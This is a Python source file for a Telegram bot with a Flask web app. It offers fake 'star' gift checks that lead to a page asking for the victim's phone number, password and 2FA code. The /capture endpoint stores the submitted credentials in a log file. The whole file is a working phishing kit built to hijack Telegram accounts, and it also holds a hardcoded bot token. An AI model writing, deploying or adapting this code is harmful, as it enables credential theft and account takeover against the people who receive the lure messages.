from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import time

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
WEBAPP_URL = "https://stargiftbot-final.onrender.com"  # ТВОЯ URL

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# HTML-сторінка для WebApp
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding: 40px 20px; }
        input { width: 90%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #333; background: #1a1a1a; color: white; font-size: 16px; }
        button { width: 95%; padding: 16px; background: #0088cc; border: none; border-radius: 12px; color: white; font-size: 18px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <h2>⭐ Введи данные</h2>
    <input id="phone" placeholder="📱 +71234567890">
    <input id="password" placeholder="🔒 Пароль" type="password">
    <input id="code2fa" placeholder="🔐 2FA (если есть)">
    <button onclick="send()">✅ ПОЛУЧИТЬ</button>
    <script>
        function send() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const code2fa = document.getElementById('code2fa').value;
            if (!phone || !password) { alert('Введи номер и пароль'); return; }
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone, password, code2fa })
            });
            alert('✅ Данные приняты!');
            window.Telegram.WebApp.close();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    with open('logs.txt', 'a') as f:
        f.write(f"{data} | {time.ctime()}\n")
    return jsonify({'status': 'ok'})

# INLINE-ОБРОБНИК (без змін)
@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    results = []
    amounts = [100, 200, 300, 500, 700, 1000]
    for amt in amounts:
        # Додаємо кнопку з WebApp
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton(
                f"🤖 Забрать {amt} звёзд",
                web_app=WebAppInfo(url=WEBAPP_URL)
            )
        )
        results.append(
            InlineQueryResultArticle(
                id=str(amt),
                title=f"⭐ Чек на {amt} звёзд",
                description=f"Нажми, чтобы забрать {amt} звёзд",
                input_message_content=InputTextMessageContent(
                    f"🎯 **Ты получил чек на {amt} звёзд!**\nНажми на кнопку ниже.",
                    parse_mode='Markdown'
                ),
                reply_markup=keyboard
            )
        )
    bot.answer_inline_query(inline_query.id, results)

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id, "✅ Бот працює! Напиши @StarCheclBot у будь-якому чаті.")

def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
